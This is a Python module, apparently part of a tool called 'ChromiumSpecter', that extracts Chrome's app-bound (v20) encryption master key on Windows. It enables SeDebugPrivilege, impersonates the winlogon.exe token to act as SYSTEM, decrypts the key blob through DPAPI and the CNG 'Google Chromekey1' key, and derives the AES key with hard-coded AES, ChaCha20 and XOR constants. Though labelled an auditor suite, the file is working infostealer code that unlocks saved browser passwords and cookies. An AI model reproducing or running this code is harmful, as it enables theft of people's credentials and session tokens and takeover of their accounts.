# 🛡️ ChromiumSpecter — Tactical Auditor Suite
# Copyright (C) 2026 ANONIMO432HZ
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://fsf.org/licenses/>.

import os
import io
import struct
import ctypes
import base64
import logging
import subprocess
from ctypes import wintypes

try:
    from Cryptodome.Cipher import AES
except ImportError:
    AES = None

logger = logging.getLogger("AuditorCore")

# --- Win32 Structs & Types ---
class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", wintypes.DWORD),
        ("HighPart", wintypes.LONG),
    ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", wintypes.DWORD),
    ]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES * 1),
    ]

# --- Native Libraries ---
advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32
ncrypt = ctypes.windll.ncrypt

# --- Function Signatures ---
OpenProcessToken = advapi32.OpenProcessToken
OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
OpenProcessToken.restype = wintypes.BOOL

LookupPrivilegeValueW = advapi32.LookupPrivilegeValueW
LookupPrivilegeValueW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(LUID)]
LookupPrivilegeValueW.restype = wintypes.BOOL

AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges
AdjustTokenPrivileges.argtypes = [wintypes.HANDLE, wintypes.BOOL, ctypes.POINTER(TOKEN_PRIVILEGES), wintypes.DWORD, ctypes.c_void_p, ctypes.POINTER(wintypes.DWORD)]
AdjustTokenPrivileges.restype = wintypes.BOOL

DuplicateTokenEx = advapi32.DuplicateTokenEx
DuplicateTokenEx.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
DuplicateTokenEx.restype = wintypes.BOOL

ImpersonateLoggedOnUser = advapi32.ImpersonateLoggedOnUser
ImpersonateLoggedOnUser.argtypes = [wintypes.HANDLE]
ImpersonateLoggedOnUser.restype = wintypes.BOOL

RevertToSelf = advapi32.RevertToSelf
RevertToSelf.argtypes = []
RevertToSelf.restype = wintypes.BOOL

NCryptOpenStorageProvider = ncrypt.NCryptOpenStorageProvider
NCryptOpenStorageProvider.argtypes = [ctypes.POINTER(ctypes.c_void_p), wintypes.LPCWSTR, wintypes.DWORD]
NCryptOpenStorageProvider.restype = wintypes.DWORD

NCryptOpenKey = ncrypt.NCryptOpenKey
NCryptOpenKey.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p), wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD]
NCryptOpenKey.restype = wintypes.DWORD

NCryptDecrypt = ncrypt.NCryptDecrypt
NCryptDecrypt.argtypes = [ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.DWORD]
NCryptDecrypt.restype = wintypes.DWORD

NCryptFreeObject = ncrypt.NCryptFreeObject
NCryptFreeObject.argtypes = [ctypes.c_void_p]
NCryptFreeObject.restype = wintypes.DWORD

# --- Constants ---
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
SE_PRIVILEGE_ENABLED = 0x00000002
PROCESS_QUERY_INFORMATION = 0x0400
NCRYPT_SILENT_FLAG = 0x40

def get_winlogon_pid() -> int:
    try:
        output = subprocess.check_output('tasklist /FI "IMAGENAME eq winlogon.exe" /NH /FO CSV', shell=True, stderr=subprocess.DEVNULL).decode()
        parts = output.strip().split(',')
        if len(parts) > 1:
            return int(parts[1].strip('"'))
    except Exception as e:
        logger.debug(f"Error getting winlogon pid: {e}")
    return 0

class TokenManager:
    """Context manager for elevating to SYSTEM by impersonating winlogon.exe"""
    def __init__(self):
        self.impersonated = False

    def enable_sedebug(self):
        hToken = wintypes.HANDLE()
        hProcess = kernel32.GetCurrentProcess()
        if not OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(hToken)):
            raise Exception("OpenProcessToken failed")
        
        luid = LUID()
        if not LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
            kernel32.CloseHandle(hToken)
            raise Exception("LookupPrivilegeValueW failed")
            
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        
        success = AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None)
        kernel32.CloseHandle(hToken)
        if not success:
            raise Exception("AdjustTokenPrivileges failed")

    def __enter__(self):
        try:
            self.enable_sedebug()
            pid = get_winlogon_pid()
            if not pid:
                raise Exception("winlogon.exe PID not found")
                
            hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
            if not hProcess:
                raise Exception("OpenProcess on winlogon.exe failed")
                
            hToken = wintypes.HANDLE()
            if not OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(hToken)):
                kernel32.CloseHandle(hProcess)
                raise Exception("OpenProcessToken on winlogon.exe failed")
                
            hDuplicateToken = wintypes.HANDLE()
            # SecurityImpersonation = 2, TokenImpersonation = 2
            if not DuplicateTokenEx(hToken, 0x02000000 | TOKEN_IMPERSONATE | TOKEN_QUERY, None, 2, 2, ctypes.byref(hDuplicateToken)):
                kernel32.CloseHandle(hToken)
                kernel32.CloseHandle(hProcess)
                raise Exception("DuplicateTokenEx failed")
                
            if not ImpersonateLoggedOnUser(hDuplicateToken):
                kernel32.CloseHandle(hDuplicateToken)
                kernel32.CloseHandle(hToken)
                kernel32.CloseHandle(hProcess)
                raise Exception("ImpersonateLoggedOnUser failed")
                
            self.impersonated = True
            
            kernel32.CloseHandle(hDuplicateToken)
            kernel32.CloseHandle(hToken)
            kernel32.CloseHandle(hProcess)
            
        except Exception as e:
            logger.debug(f"TokenManager setup failed: {e}")
            raise
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.impersonated:
            RevertToSelf()
            self.impersonated = False

def decrypt_with_cng(input_data: bytes) -> bytes:
    hProvider = ctypes.c_void_p()
    status = NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
    if status != 0: raise Exception(f"NCryptOpenStorageProvider failed: {status}")

    hKey = ctypes.c_void_p()
    status = NCryptOpenKey(hProvider, ctypes.byref(hKey), "Google Chromekey1", 0, 0)
    if status != 0: 
        NCryptFreeObject(hProvider)
        raise Exception(f"NCryptOpenKey failed: {status}")

    pcbResult = wintypes.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = NCryptDecrypt(hKey, ctypes.byref(input_buffer), len(input_buffer), None, None, 0, ctypes.byref(pcbResult), NCRYPT_SILENT_FLAG)
    if status != 0:
        NCryptFreeObject(hKey)
        NCryptFreeObject(hProvider)
        raise Exception(f"1st NCryptDecrypt failed: {status}")

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * buffer_size)()

    status = NCryptDecrypt(hKey, ctypes.byref(input_buffer), len(input_buffer), None, ctypes.byref(output_buffer), buffer_size, ctypes.byref(pcbResult), NCRYPT_SILENT_FLAG)
    if status != 0:
        NCryptFreeObject(hKey)
        NCryptFreeObject(hProvider)
        raise Exception(f"2nd NCryptDecrypt failed: {status}")

    NCryptFreeObject(hKey)
    NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data

def byte_xor(ba1: bytes, ba2: bytes) -> bytes:
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes | None:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        if not AES: raise ImportError("Cryptodome is required for flag 1")
        cipher = AES.new(aes_key, AES.MODE_GCM, parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        try:
            from Cryptodome.Cipher import ChaCha20_Poly1305
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
            return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
        except Exception as e:
            logger.debug(f"ChaCha20_Poly1305 not available or failed: {e}")
            return None

    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with TokenManager():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        if not AES: raise ImportError("Cryptodome is required for flag 3")
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    return None

def get_v20_key(encrypted_key_b64: bytes, win32crypt_module) -> bytes | None:
    """Entry point for main.py to extract V20 AES master key"""
    try:
        raw = base64.b64decode(encrypted_key_b64)
        if not raw.startswith(b"APPB"):
            return None
            
        key_blob_encrypted = raw[4:]
        
        with TokenManager():
            try:
                key_blob_system_decrypted = win32crypt_module.CryptUnprotectData(key_blob_encrypted, None, None, None, 0)[1]
            except Exception as e:
                logger.debug(f"SYSTEM CryptUnprotectData failed: {e}")
                return None
                
        try:
            key_blob_user_decrypted = win32crypt_module.CryptUnprotectData(key_blob_system_decrypted, None, None, None, 0)[1]
        except Exception as e:
            logger.debug(f"User CryptUnprotectData failed: {e}")
            return None
            
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        return derive_v20_master_key(parsed_data)
        
    except Exception as e:
        logger.debug(f"get_v20_key failed: {e}")
        return None
